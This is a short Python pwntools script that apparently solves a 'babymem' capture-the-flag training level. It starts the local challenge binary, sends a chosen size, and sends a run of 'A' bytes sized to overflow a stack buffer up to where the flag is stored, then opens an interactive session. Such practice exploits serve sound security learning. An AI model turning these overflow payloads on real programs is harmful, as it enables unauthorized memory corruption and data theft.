from pwn import *

# Init
elf = ELF("/challenge/babymem_level10.1")

buffer_length = int("158", 16) #local_158
read_offset = int("47", 16) #local_158 + 0x47 for the declaration of local_160 (the point where the flag readed is saved)

io = elf.process()

# Payload
payload = b"A"*read_offset

# Interaction
io.recvuntil("size:")
io.sendline(str(read_offset))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()